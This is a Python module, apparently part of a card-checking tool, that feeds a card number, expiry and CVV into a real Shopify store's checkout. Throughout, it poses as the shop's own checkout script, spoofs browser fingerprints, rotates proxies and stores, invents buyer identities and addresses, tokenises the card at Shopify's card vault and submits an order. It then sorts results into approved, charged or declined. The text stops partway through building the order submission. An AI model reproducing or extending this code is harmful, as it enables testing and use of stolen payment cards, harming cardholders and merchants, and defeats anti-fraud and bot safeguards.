"""The checkout: the card is put into a real order.

The steps are the ones a person takes:

  1. the goods list is read and a thing in stock is chosen,
  2. the thing is put into the basket,
  3. the basket is taken to the checkout, and the shop's own script is
     asked for the price of the order, so the total is the shop's total,
  4. the card is given to the shop's card vault,
  5. the order is placed, and the receipt is waited for.

Every word the shop says is passed on as it is said.
"""

import asyncio
import json
import logging
import os
import random
import re
import time
from typing import Any, Optional

from .shopify_native_gate import (
    DEFAULT_SITE_ROTATION,
    FORCED_VARIANTS,
    MAX_VARIANT_PRICE,
    MIN_VARIANT_PRICE,
    UA,
    _can_attempt,
    _clear_site_cooldown,
    _is_proxy_cooling,
    _is_site_cooling,
    _normalize_site_key,
    _pick_best_variant,
    _proxy_key,
    _record_attempt,
    _set_site_cooldown,
    extract_between,
    fetch_products,
    get_all_variants_for_site,
    lookup_variant_cache,
    lookup_variant_exclude,
    make_cffi_session,
    parse_proxy,
    pick_addr,
    pick_browser_profile,
    random_identity,
)

logger = logging.getLogger("shopify_native_gate")

# The query ids the shop's own script sends.  They are the ones the
# script of the shop uses, so the asking looks like the asking of the
# script and not like the asking of a program.
PERSISTED_ID_PROPOSAL = ("63010683e9bbc8784e79a2d85c7aa2a6a431fd4c2b791eeb"
                         "ec88e95665f16e8a")
PERSISTED_ID_SUBMIT = ("d175350fa2abc713b3171bd7eee3d6443861a7c884298fde"
                        "2bea9d60abbebcf6")
PERSISTED_ID_POLL = ("cb31a1b2197416d7441bf789defc306069c385c558764a58"
                      "648f18cba899a29a")

PCI_BUILD_ID = "5cdd519"

# What the shop says, and what it means.
_ANSWER_WORDS = (
    (("INSUFFICIENT_FUNDS", "INSUFFICIENT"), "INSUFFICIENT_FUNDS"),
    (("INVALID_CVC", "INVALID_SECURITY_CODE", "CVC_FAILURE", "CVV_FAILURE",
      "INCORRECT_CVC", "CVC_CHECK_FAILED"), "INVALID_CVC"),
    (("EXPIRED", "EXPIRY", "INVALID_EXPIRY", "BASE_EXPIRED", "CARD_EXPIRED"),
     "EXPIRED_CARD"),
    (("INVALID_NUMBER", "NO_SUCH_ISSUER", "INVALID_CARD", "INCORRECT_NUMBER",
      "BAD_NUMBER", "CARD_NOT_SUPPORTED"), "INVALID_CARD"),
    (("LOST", "STOLEN", "PICKUP", "RESTRICTED", "REVOCATION"), "CARD_DECLINED"),
    (("CALL_ISSUER", "REFER_TO_ISSUER"), "CARD_DECLINED"),
    (("GENERIC_DECLINE", "TRANSACTION_NOT_ALLOWED", "NOT_PERMITTED",
      "DO_NOT_HONOR", "SERVICE_NOT_ALLOWED"), "CARD_DECLINED"),
    (("CAPTCHA", "HCAPTCHA", "BOT_DETECTION", "CHALLENGE_REQUIRED"),
     "CAPTCHA_REQUIRED"),
    (("OUT_OF_STOCK", "SOLD_OUT", "INVENTORY"), "NO_PRODUCT"),
    (("THROTTLED", "RATE_LIMIT", "TOO_MANY_REQUESTS"), "THROTTLED"),
    (("SESSION_EXPIRED", "TOKEN_EXPIRED", "INVALID_SESSION"), "SESSION_EXPIRED"),
    (("LOGIN_REQUIRED", "ACCOUNT_REQUIRED"), "SITE_REQUIRES_LOGIN"),
    # The shop is talking about the order and not about the card: the
    # tax changed, the delivery changed, the amount is not accepted, or
    # the price of the thing is not what was thought.  The next shop is
    # asked, because none of these is a word about the card.
    (("TAX_NEW_TAX_MUST_BE_ACCEPTED", "TAX_MUST_BE_ACCEPTED",
      "TAXES_NOT_ACCEPTED", "TAX_NEW_TAX"),
     "SHOP_ORDER_ERROR"),
    (("DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
      "DELIVERY_LINE_DETAIL_CHANGED", "DELIVERY_ADDRESS_CHANGED",
      "DELIVERY_UNAVAILABLE", "DELIVERY_ADDRESS_INVALID",
      "DELIVERY_STRATEGY_CONDITIONS_NOT_SATISFIED",
      "DELIVERY_METHOD_UNAVAILABLE", "DELIVERY_LINE_NOT_FOUND",
      "DELIVERY_OPTION_UNAVAILABLE", "DELIVERY_TAX_MUST_BE_ACCEPTED"),
     "SHOP_ORDER_ERROR"),
    (("MERCHANDISE_EXPECTED_PRICE_MISMATCH",
      "MERCHANDISE_PRICE_CHANGED", "MERCHANDISE_NOT_AVAILABLE",
      "MERCHANDISE_OUT_OF_STOCK", "MERCHANDISE_VARIANT_UNAVAILABLE"),
     "SHOP_ORDER_ERROR"),
    (("PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT",
      "PAYMENTS_PAYMENT_METHOD_UNAVAILABLE", "WAITING_PENDING_TERMS",
      "PAYMENTS_FIRST_NAME_REQUIRED", "PAYMENTS_LAST_NAME_REQUIRED",
      "PAYMENTS_ADDRESS1_REQUIRED", "PAYMENTS_POSTAL_CODE_REQUIRED",
      "PAYMENTS_CITY_REQUIRED"), "SHOP_ORDER_ERROR"),
    # The processor gave up, not the bank.  This says nothing about the
    # card, so the next shop is asked.
    (("PROCESSING_ERROR", "PROCESSING ERROR", "PROCESSOR_ERROR",
      "GATEWAY_ERROR"), "PROCESSING_ERROR"),
)


def _the_words(raw: Optional[str]) -> str:
    """What the shop said, in the words we use."""
    if not raw:
        return "CARD_DECLINED"
    text = str(raw).upper()
    for keys, name in _ANSWER_WORDS:
        if any(k in text for k in keys):
            return name
    return "CARD_DECLINED"


def _the_word_of_the_shop(raw: Optional[str]) -> str:
    """The word of the shop, without the whole of the answer in one lump.

    The shop gives its answer as a list of errors, and each one has a
    code and a message.  The code is the word, and the message beside it
    is what the shop says in the words of a person.
    """
    if not raw:
        return ""
    text = str(raw)
    try:
        data = json.loads(text)
    except Exception:
        return text[:110]
    errs = data if isinstance(data, list) else (data.get("errors") or [])
    if not errs:
        return text[:110]
    best = ""
    for one in errs:
        if not isinstance(one, dict):
            continue
        code = str(one.get("code") or "").upper()
        said = str(one.get("localizedMessage") or one.get("message") or "")
        if not said:
            said = code
        if code:
            said = "%s — %s" % (code, said)
        if len(said) > len(best):
            best = said
    return best[:150] or text[:110]


def _checkout_total(running_total, shipping_amount, tax_amount=0) -> str:
    """What the card will be put up for.

    The shop's running total is sometimes the things alone and
    sometimes the things and the postage, so the postage is not added
    twice.
    """
    try:
        rt = float(running_total)
    except (TypeError, ValueError):
        rt = 0.0
    try:
        ship = float(shipping_amount)
    except (TypeError, ValueError):
        ship = 0.0
    try:
        tax = float(tax_amount)
    except (TypeError, ValueError):
        tax = 0.0
    if ship > 0.001 and rt >= ship:
        maybe = rt - ship
        if 0.50 <= maybe <= MAX_VARIANT_PRICE:
            return "%.2f" % (rt + tax)
    return "%.2f" % (rt + ship + tax)


# ---------------------------------------------------------------------------
# The words the shop's own script asks with.  They are taken as they are:
# a shop answers the asking of its own script and turns away the asking
# of something else.
# ---------------------------------------------------------------------------
_PROPOSAL_VARS = (
    "$sessionInput:SessionTokenInput!,"
    "$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
    "$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,"
    "$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,"
    "$checkpointData:String,$queueToken:String,"
    "$reduction:ReductionInput,"
    "$availableRedeemables:AvailableRedeemablesInput,"
    "$tip:TipTermInput,$note:NoteInput,"
    "$localizationExtension:LocalizationExtensionInput,"
    "$nonNegotiableTerms:NonNegotiableTermsInput,"
    "$scriptFingerprint:ScriptFingerprintInput,"
    "$transformerFingerprintV2:String,"
    "$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,"
    "$captcha:CaptchaInput,$poNumber:String,"
    "$saleAttributions:SaleAttributionsInput,"
    "$alternativePaymentCurrency:AlternativePaymentCurrencyInput,"
    "$deliveryExpectations:DeliveryExpectationTermsInput,"
    "$memberships:MembershipsInput,"
    "$cartMetafields:[CartMetafieldOperationInput!]"
)

_PROPOSAL_ARGS = (
    "delivery:$delivery,discounts:$discounts,payment:$payment,"
    "merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,"
    "reduction:$reduction,availableRedeemables:$availableRedeemables,"
    "tip:$tip,note:$note,poNumber:$poNumber,"
    "nonNegotiableTerms:$nonNegotiableTerms,"
    "localizationExtension:$localizationExtension,"
    "scriptFingerprint:$scriptFingerprint,"
    "transformerFingerprintV2:$transformerFingerprintV2,"
    "optionalDuties:$optionalDuties,attribution:$attribution,"
    "captcha:$captcha,saleAttributions:$saleAttributions,"
    "alternativePaymentCurrency:$alternativePaymentCurrency,"
    "deliveryExpectations:$deliveryExpectations,"
    "memberships:$memberships,"
    "cartMetafields:$cartMetafields"
)

_SELLER_PROPOSAL_FIELDS = (
    "sellerProposal{"
    "runningTotal{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "total{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "delivery{__typename "
    "...on FilledDeliveryTerms{deliveryLines{"
    "availableDeliveryStrategies{__typename "
    "...on CompleteDeliveryStrategy{handle title "
    "amount{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "estimatedTimeInTransit{...on IntValueConstraint{value}}}}"
    "selectedDeliveryStrategy{__typename "
    "...on CompleteDeliveryStrategy{handle title "
    "amount{...on MoneyValueConstraint{value{amount currencyCode}}}}}}}}"
    "tax{__typename "
    "...on FilledTaxTerms{totalTaxAmount{...on "
    "MoneyValueConstraint{value{amount currencyCode}}}}}"
    "payment{__typename "
    "...on FilledPaymentTerms{availablePaymentLines{"
    "paymentMethod{__typename "
    "...on PaymentProvider{paymentMethodIdentifier name extensibilityDisplayName}"
    "...on CustomerCreditCardPaymentMethod{paymentMethodIdentifier displayLastDigits brand}}}}} "
    "__typename}"
)

QUERY_PROPOSAL_SHIPPING = (
    "query Proposal(" + _PROPOSAL_VARS + ")"
    "{session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{"
    + _PROPOSAL_ARGS + "},"
    "checkpointData:$checkpointData,queueToken:$queueToken})"
    "{__typename result{__typename "
    "...on NegotiationResultAvailable{checkpointData queueToken sessionToken "
    + _SELLER_PROPOSAL_FIELDS + "}"
    "...on CheckpointDenied{redirectUrl}"
    "...on Throttled{pollAfter queueToken pollUrl}"
    "...on TooManyRequests{__typename}"
    "...on NegotiationResultFailed{__typename}}"
    "errors{code localizedMessage nonLocalizedMessage __typename}}}}"
)

_RECEIPT_FRAGMENT = (
    "fragment ReceiptDetails on Receipt{"
    "...on ProcessedReceipt{id token __typename}"
    "...on ProcessingReceipt{id pollDelay __typename}"
    "...on WaitingReceipt{id pollDelay __typename}"
    "...on ActionRequiredReceipt{id action{"
    "...on CompletePaymentChallenge{offsiteRedirect url __typename}"
    "...on CompletePaymentChallengeV2{challengeType challengeData __typename}"
    "__typename}timeout{millisecondsRemaining __typename}__typename}"
    "...on FailedReceipt{id processingError{"
    "...on InventoryClaimFailure{__typename}"
    "...on InventoryReservationFailure{__typename}"
    "...on OrderCreationFailure{paymentsHaveBeenReverted __typename}"
    "...on PaymentFailed{code messageUntranslated __typename}"
    "__typename}__typename}__typename}"
)

QUERY_PROPOSAL_DELIVERY = (
    "query Proposal(" + _PROPOSAL_VARS + ")"
    "{session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{"
    + _PROPOSAL_ARGS + "},"
    "checkpointData:$checkpointData,queueToken:$queueToken})"
    "{__typename result{__typename "
    "...on NegotiationResultAvailable{checkpointData queueToken sessionToken "
    + _SELLER_PROPOSAL_FIELDS + "}"
    "...on CheckpointDenied{redirectUrl}"
    "...on Throttled{pollAfter queueToken pollUrl}"
    "...on TooManyRequests{__typename}"
    "...on SubmittedForCompletion{receipt{...ReceiptDetails}}"
    "...on NegotiationResultFailed{__typename}}"
    "errors{code localizedMessage nonLocalizedMessage __typename}}}}"
    + _RECEIPT_FRAGMENT
)

MUTATION_SUBMIT = (
    "mutation SubmitForCompletion("
    "$input:NegotiationInput!,$attemptToken:String!,"
    "$metafields:[MetafieldInput!],"
    "$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,"
    "$analytics:AnalyticsInput)"
    "{submitForCompletion(input:$input attemptToken:$attemptToken "
    "metafields:$metafields "
    "postPurchaseInquiryResult:$postPurchaseInquiryResult "
    "analytics:$analytics){"
    "...on SubmitSuccess{receipt{...ReceiptDetails}__typename}"
    "...on SubmitAlreadyAccepted{receipt{...ReceiptDetails}__typename}"
    "...on SubmitFailed{reason __typename}"
    "...on SubmitRejected{"
    "errors{code localizedMessage nonLocalizedMessage __typename}__typename}"
    "...on Throttled{pollAfter pollUrl queueToken __typename}"
    "...on CheckpointDenied{redirectUrl __typename}"
    "...on SubmittedForCompletion{receipt{...ReceiptDetails}__typename}"
    "...on TooManyRequests{__typename}"
    "...on TooManyAttempts{__typename}"
    "__typename}}"
    + _RECEIPT_FRAGMENT
)

QUERY_POLL = (
    "query PollForReceipt($receiptId:ID!,$sessionToken:String!)"
    "{receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken})"
    "{...ReceiptDetails __typename}}"
    + _RECEIPT_FRAGMENT
)

_GQL = {
    "proposal": QUERY_PROPOSAL_SHIPPING,
    "submit": MUTATION_SUBMIT,
    "poll": QUERY_POLL,
}



async def _the_checkout_page(session, ourl: str, base_headers: dict) -> tuple:
    """The checkout page of the shop, and what is in it."""
    try:
        resp = await session.post("%s/checkout/" % ourl, allow_redirects=True,
                                  headers={**base_headers,
                                           "Accept": ("text/html,application/xhtml+xml,"
                                                      "application/xml;q=0.9,*/*;q=0.8")})
        return str(resp.url), resp.text, dict(resp.headers or {})
    except Exception as e:
        return "", "", {}


def _the_session_token(page_text: str, headers: dict) -> Optional[str]:
    for key in ("x-checkout-one-session-token",
                "X-Checkout-One-Session-Token"):
        if key in headers:
            return headers[key]
    for start, end in (
            ('name="serialized-sessionToken" content="&quot;', "&quot;"),
            ('name="serialized-sessionToken" content="', '"'),
            ('"serializedSessionToken":"', '"'),
            ('"sessionToken":"', '"'),
            ("sessionToken&quot;:&quot;", "&quot;"),
            ('data-session-token="', '"'),
            ('"checkout_session_token":"', '"'),
    ):
        val = extract_between(page_text, start, end)
        if val and len(val) > 10:
            return val
    return None


async def _the_proposal(session, graphql_url: str, headers: dict,
                        variables: dict, sst: str) -> tuple:
    """The shop is asked for the price of the order.

    The shop's own script asks it this way, so the asking is asked
    the same way.
    """
    last = None
    for attempt in range(2):
        try:
            resp = await session.post(graphql_url,
                                      params={"operationName": "Proposal"},
                                      headers=headers,
                                      json={"query": _GQL["proposal"],
                                            "variables": variables,
                                            "operationName": "Proposal"})
            return resp.status_code, resp.text
        except Exception as e:
            last = str(e)
            await asyncio.sleep(0.6)
    return 0, str(last)


async def check_card_native(cc: str, mm: str, yy: str, cvv: str,
                            site_url: Optional[str] = None,
                            proxy_str: Optional[str] = None,
                            max_price: Optional[float] = None) -> dict:
    """The card is put into a real checkout of a real shop."""
    start = time.time()
    cap = float(max_price if max_price is not None else MAX_VARIANT_PRICE)
    profile = pick_browser_profile()

    def _r(response: str, message: str = "", product: str = "",
          price: str = "0.00", charged: bool = False,
          site_error: bool = False) -> dict:
        return {
            "Response": response,
            "Message": message or response,
            "code": response,
            "decline_code": response,
            "Gateway": "Shopify Payments",
            "Price": price,
            "Proxy": "Live",
            "Status": not site_error,
            "Gate": "Shopify Payments",
            "CC": "%s|%s|%s|%s" % (cc, mm, yy, cvv),
            "Product": product,
            "Site": site_url or "",
            "Charged": "True" if charged else "False",
            "Approved": "True" if charged else "False",
            "Time": "%.2fs" % (time.time() - start),
            "Retry": site_error,
        }

    # The stores that are asked, and in what order.
    if site_url:
        sites = [site_url]
    else:
        sites = list(DEFAULT_SITE_ROTATION)
    random.shuffle(sites)

    last = None
    for site in sites:
        key = _normalize_site_key(site)
        if _is_site_cooling(key) or _is_proxy_cooling(proxy_str):
            continue
        allowed, wait = _can_attempt(key, proxy_str)
        if not allowed:
            await asyncio.sleep(min(wait, 3))
        _record_attempt(key, proxy_str)

        out = await _one_shop(cc, mm, yy, cvv, site, proxy_str, cap,
                              profile, _r)
        if out is None:
            continue
        code = str(out.get("Response") or "")
        if code in ("THROTTLED",):
            _set_site_cooldown(key, proxy_str)
            last = out
            continue
        _clear_site_cooldown(key)
        return out

    if last is not None:
        return last
    return _r("NO_PRODUCT", "No shop was free to answer")


async def _one_shop(cc, mm, yy, cvv, site, proxy_str, cap, profile, _r) -> Optional[dict]:
    """The card is put into the checkout of one shop."""
    if not site.startswith("http"):
        site = "https://" + site
    ourl = site
    host = ourl.split("//")[-1].split("/")[0]

    # The thing that is bought: the one that is always taken from this
    # shop, or one out of the database, or one the shop itself names.
    forced = FORCED_VARIANTS.get(host.replace("www.", "")) or \
        FORCED_VARIANTS.get(host)
    variant_id = None
    price = None
    product_title = ""
    if forced:
        variant_id, price = forced[0], forced[1]
    else:
        cached = lookup_variant_cache(ourl)
        if cached:
            variant_id, price = cached["variant_id"], cached["price"]
        else:
            got, why = await fetch_products(ourl, proxy_str)
            if not got:
                if why == "THROTTLED":
                    return _r("THROTTLED", "The store is rate limiting us",
                              site_error=True)
                return _r("NO_PRODUCT", why or "No products", site_error=True)
            variant_id, price = got["variant_id"], got["price"]
            product_title = got.get("product_handle") or ""

    proxy = parse_proxy(proxy_str) if proxy_str else None
    # The place is given to the handshake as it has been read, for the
    # handshake cannot read it: a place written as ip:port:user:pass is
    # not a place a browser can be given.
    session = make_cffi_session(proxy, profile)
    if session is None:
        return _r("PROXY_ERROR", "The browser handshake is not here",
                  site_error=True)

    base_headers = {
        "User-Agent": profile["ua"],
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json",
        "Origin": ourl,
        "Referer": "%s/" % ourl,
        "sec-ch-ua": profile["sec_ch_ua"],
        "sec-ch-ua-mobile": profile["mobile"],
        "sec-ch-ua-platform": profile["platform"],
    }

    try:
        # ── the thing is put into the basket ──────────────────────────
        added = False
        for payload, ct in (
                ("id=%s&quantity=1" % variant_id,
                 "application/x-www-form-urlencoded"),
                (json.dumps({"items": [{"id": int(variant_id),
                                        "quantity": 1}]}),
                 "application/json"),
        ):
            try:
                resp = await session.post("%s/cart/add.js" % ourl, data=payload,
                                          headers={**base_headers,
                                                   "Content-Type": ct,
                                                   "Accept": "application/json"})
            except Exception:
                continue
            if resp.status_code == 200:
                added = True
                break
            if resp.status_code in (429, 430):
                return _r("THROTTLED", "The store is rate limiting us",
                          site_error=True)
        if not added:
            return _r("CART_FAILED", "Could not add to cart", site_error=True)

        # ── the basket is taken to the checkout ───────────────────────
        checkout_url, page_text, page_headers = await _the_checkout_page(
            session, ourl, base_headers)
        if not page_text:
            return _r("TIMEOUT", "The checkout page did not come",
                      site_error=True)
        if any(x in page_text.lower() for x in ("hcaptcha", "recaptcha",
                                                "turnstile", "challenge-platform")):
            return _r("CAPTCHA_REQUIRED", "The store asked for a captcha",
                      site_error=True)

        attempt_token = ""
        m = re.search(r"/checkouts/cn/([^/?#]+)", checkout_url)
        if m:
            attempt_token = m.group(1)
        else:
            attempt_token = checkout_url.rstrip("/").split("/")[-1].split("?")[0]
        if not attempt_token or len(attempt_token) < 4:
            return _r("NO_ATTEMPT_TOKEN", "No attempt token in the page",
                      site_error=True)

        sst = _the_session_token(page_text, page_headers)
        if not sst:
            return _r("NO_SESSION_TOKEN", "No session token in the page",
                      site_error=True)

        queue_token = (extract_between(page_text,
                                        'queueToken&quot;:&quot;', "&quot;")
                       or extract_between(page_text, '"queueToken":"', '"') or "")
        stable_id = (extract_between(page_text, 'stableId&quot;:&quot;', "&quot;")
                     or extract_between(page_text, '"stableId":"', '"') or "1")
        merch_gid = (extract_between(page_text, "ProductVariantMerchandise/",
                                     "&quot;")
                     or extract_between(page_text, "ProductVariantMerchandise/", "'")
                     or str(variant_id))

        currency = "USD"
        for start_s, end_s in (('currencyCode&quot;:&quot;', "&quot;"),
                               ('"currencyCode":"', '"')):
            val = extract_between(page_text, start_s, end_s)
            if val and len(val) == 3 and val.isalpha():
                currency = val.upper()
                break

        # The country of the shop is read from the page, for the money
        # of the shop is not the country of the shop: a shop in another
        # country takes dollars and does not send to America, and says
        # the things cannot be shipped to the address.
        shop_country = ""
        for _s, _e in (('countryCode&quot;:&quot;', "&quot;"),
                        ('"countryCode":"', '"'),
                        ('"checkoutCountryCode":"', '"'),
                        ('&quot;checkoutCountryCode&quot;:&quot;', '&quot;')):
            _val = extract_between(page_text, _s, _e)
            if _val and len(_val) == 2 and _val.isalpha():
                shop_country = _val.upper()
                break

        addr = pick_addr(currency)
        first, last_name, email = random_identity()
        street, city, state = addr["address1"], addr["city"], addr["zoneCode"]
        z_zip, phone = addr["postalCode"], addr["phone"]
        country = addr.get("countryCode", "US")

        subtotal = (extract_between(
            page_text,
            'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;',
            "&quot;")
            or extract_between(
                page_text,
                '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"'))
        if not subtotal:
            m2 = re.search(r'"price":\s*"([\d.]+)"', page_text)
            subtotal = m2.group(1) if m2 else "0.01"

        unescaped = page_text.replace("&quot;", '"').replace("&amp;", "&")
        build_id = None
        m3 = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
        if m3:
            build_id = m3.group(1)
        ident_sig = None
        m4 = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"',
                        unescaped)
        if m4:
            ident_sig = m4.group(1)

        graphql_url = "https://%s/checkouts/unstable/graphql" % host
        gql_headers = {
            **base_headers,
            "shopify-checkout-client": "checkout-web/1.0",
            "shopify-checkout-source": 'id="%s", type="cn"' % attempt_token,
            "x-checkout-one-session-token": sst,
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
        }
        if build_id:
            gql_headers["x-checkout-web-build-id"] = build_id
            gql_headers["x-checkout-web-deploy-stage"] = "production"

        merch_id_full = "gid://shopify/ProductVariantMerchandise/%s" % merch_gid
        variant_id_full = "gid://shopify/ProductVariant/%s" % variant_id

        def _variables(delivery_handle: str = "", shipping: float = 0.0,
                       tax: float = 0.0) -> dict:
            return {
                "sessionInput": {"sessionToken": sst},
                "queueToken": queue_token or "",
                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                "delivery": {
                    "deliveryLines": [{
                        "destination": {"partialStreetAddress": {
                            "address1": street, "address2": "", "city": city,
                            "countryCode": country, "postalCode": z_zip,
                            "firstName": first, "lastName": last_name,
                            "zoneCode": state, "phone": phone}},
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyMatchingConditions": {
                                "estimatedTimeInTransit": {"any": True},
                                "shipments": {"any": True}},
                            "options": {}},
                        "targetMerchandiseLines": {"any": True},
                        "deliveryMethodTypes": ["SHIPPING"],
                        "expectedTotalPrice": {"any": True},
                        "destinationChanged": True,
                    }],
                    "noDeliveryRequired": [],
                    "useProgressiveRates": False,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True,
                },
                "merchandise": {"merchandiseLines": [{
                    "stableId": stable_id,
                    "merchandise": {"productVariantReference": {
                        "id": merch_id_full, "variantId": variant_id_full,
                        "properties": [], "sellingPlanId": None,
                        "sellingPlanDigest": None}},
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"value": {"amount": subtotal,
                                                     "currencyCode": currency}},
                    "lineComponentsSource": None,
                    "lineComponents": [],
                }]},
                "payment": {
                    "totalAmount": {"any": True},
                    "paymentLines": [],
                    "billingAddress": {"streetAddress": {
                        "address1": "", "city": "", "countryCode": country,
                        "lastName": "", "zoneCode": state, "phone": ""}},
                },
                "buyerIdentity": {
                    "customer": {"presentmentCurrency": currency,
                                  "countryCode": country},
                    "email": email, "emailChanged": False,
                    "phoneCountryCode": country,
                    "marketingConsent": [{"email": {"value": email}}],
                    "shopPayOptInPhone": {"countryCode": country},
                    "rememberMe": False,
                },
                "tip": {"tipLines": []},
                "taxes": {
                    "proposedAllocations": None,
                    "proposedTotalAmount": {"value": {"amount": "0",
                                                      "currencyCode": currency}},
                    "proposedTotalIncludedAmount": None,
                    "proposedMixedStateTotalAmount": None,
                    "proposedExemptions": [],
                },
                "note": {"message": None, "customAttributes": []},
                "localizationExtension": {"fields": []},
                "nonNegotiableTerms": None,
                "scriptFingerprint": {"signature": None, "signatureUuid": None,
                                      "lineItemScriptChanges": [],
                                      "paymentScriptChanges": [],
                                      "shippingScriptChanges": []},
                "optionalDuties": {"buyerRefusesDuties": False},
                "deliveryExpectations": {"deliveryExpectationLines": []},
                "memberships": {"memberships": []},
                "cartMetafields": [],
            }

        # ── the shop is asked for the price of the order ──────────────
        status, text = await _the_proposal(session, graphql_url, gql_headers,
                                           _variables(), sst)
        try:
            data = json.loads(text)
        except Exception:
            return _r("GRAPHQL_ERROR", "The shop did not answer",
                      site_error=True)
        if status == 429:
            return _r("THROTTLED", "The store is rate limiting us",
                      site_error=True)
        errs = (data.get("errors") or [])
        if errs:
            said = _the_words(json.dumps(errs)[:200])
            if said != "CARD_DECLINED":
                return _r(said, json.dumps(errs)[:120], site_error=True)
        negotiate = ((data.get("data") or {}).get("session") or {}).get("negotiate") or {}
        result = negotiate.get("result") or {}
        kind = result.get("__typename", "")
        if kind == "CheckpointDenied":
            return _r("CHECKPOINTDENIED", "The shop would not go on",
                      site_error=True)
        if kind in ("Throttled", "TooManyRequests"):
            return _r("THROTTLED", "The store is rate limiting us",
                      site_error=True)
        if kind == "NegotiationResultFailed":
            return _r("NEGOTIATE_FAILED", "The order would not be priced",
                      site_error=True)
        seller = result.get("sellerProposal") or {}
        if not seller:
            return _r("NO_SELLER_PROPOSAL", "No price for the order",
                      site_error=True)

        running_total = ((seller.get("runningTotal") or {}).get("value") or {}
                         ).get("amount") or "0"
        shipping = 0.0
        delivery_handle = ""
        delivery = seller.get("delivery") or {}
        if delivery.get("__typename") == "FilledDeliveryTerms":
            lines = delivery.get("deliveryLines") or []
            if lines:
                strategies = lines[0].get("availableDeliveryStrategies") or []
                if strategies:
                    def _cost(s):
                        try:
                            a = s.get("amount") or {}
                            return float(a.get("value", {}).get("amount")
                                         or a.get("amount") or "0")
                        except (TypeError, ValueError):
                            return float("inf")
                    cheapest = min(strategies, key=_cost)
                    delivery_handle = cheapest.get("handle", "")
                    try:
                        shipping = float(
                            (cheapest.get("amount") or {}).get("value", {})
                            .get("amount") or
                            (cheapest.get("amount") or {}).get("amount") or "0")
                    except (TypeError, ValueError):
                        shipping = 0.0
        tax = 0.0
        tax_data = seller.get("tax") or {}
        if tax_data.get("__typename") == "FilledTaxTerms":
            try:
                tax = float(
                    (tax_data.get("totalTaxAmount") or {}).get("value", {})
                    .get("amount") or
                    (tax_data.get("totalTaxAmount") or {}).get("amount") or "0")
            except (TypeError, ValueError):
                tax = 0.0

        payment = seller.get("payment") or {}
        payment_identifier = None
        if payment.get("__typename") == "FilledPaymentTerms":
            for line in payment.get("availablePaymentLines") or []:
                pm = line.get("paymentMethod") or {}
                pid = pm.get("paymentMethodIdentifier")
                if pid:
                    payment_identifier = pid
                    break
        if not payment_identifier:
            return _r("NO_SHOPIFY_PAYMENTS_GATEWAY",
                      "The store does not take cards this way", site_error=True)

        total = _checkout_total(running_total, shipping, tax)
        try:
            if float(total) > cap:
                return _r("PRICE_OVER_MAX: total $%s > $%.2f" % (total, cap),
                          "The order comes to $%s" % total, price=total,
                          site_error=True)
        except (TypeError, ValueError):
            pass

        # ── the card is given to the card vault of the shop ───────────
        vault = {
            "credit_card": {
                "number": cc,
                "month": int(mm),
                "year": int("20%s" % yy),
                "verification_value": cvv,
                "name": "%s %s" % (first, last_name),
                "start_month": None, "start_year": None, "issue_number": "",
            },
            "payment_session_scope": host,
        }
        vault_headers = {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": "https://checkout.pci.shopifyinc.com",
            "User-Agent": profile["ua"],
            "sec-ch-ua-mobile": profile["mobile"],
            "sec-ch-ua-platform": profile["platform"],
        }
        if ident_sig:
            vault_headers["shopify-identification-signature"] = ident_sig

        token = None
        for vault_url in ("https://checkout.pci.shopifyinc.com/sessions",
                          "https://deposit.shopifyinc.com/sessions"):
            try:
                resp = await session.post(vault_url, json=vault,
                                          headers=vault_headers)
                token = (json.loads(resp.text) or {}).get("id")
            except Exception:
                continue
            if token:
                break
        if not token:
            return _r("TOKENIZATION_FAILED",
                      "The card vault would not take the card",
                      site_error=True)

        # ── the order is placed ────────────────────────────────────────
        submit_vars = _variables(delivery_handle, shipping, tax)
        submit_vars["sessionInput"]["sessionToken"] = sst
        submit_vars["delivery"]["deliveryLines"][0]["selectedDeliveryStrategy"] = {
            "deliveryStrategyByHandle": {"handle": delivery_handle,
                                         "customDeliveryRate": False},
            "options": {},
        }
        submit_vars["delivery"]["deliveryLines"][0]["expectedTotalPrice"] = {
            "value": {"amount": "%.2f" % shipping, "currencyCode": currency}}
        submit_vars["delivery"]["deliveryLines"][0]["destination"] = {
            "streetAddress": {
                "address1": street, "address2": "", "city": city,
                "countryCode": country, "postalCode": z_zip,
                "firstName": first, "lastName": last_name,
                "zoneCode": state, "phone": phone}}
        submit_vars["payment"]["billingAddress"] = {
            "streetAddress": {
                "address1": street, "address2": "", "city": city,
                "countryCode": country, "postalCode": z_zip,
                "firstName": first, "lastName": last_name,
                "zoneCode": state, "phone": phone}}
        submit_vars["taxes"]["proposedTotalAmount"] = {
            "value": {"amount": "%.2f" % tax, "currencyCode": currency}}
        submit_vars["buyerIdentity"]["shopPayOptInPhone"] = {
            "number": phone, "countryCode": country}

        body = {
            "query": _GQL["submit"],
            "variables": {
                "input": {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken": queue_token or "",
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": submit_vars["delivery"],
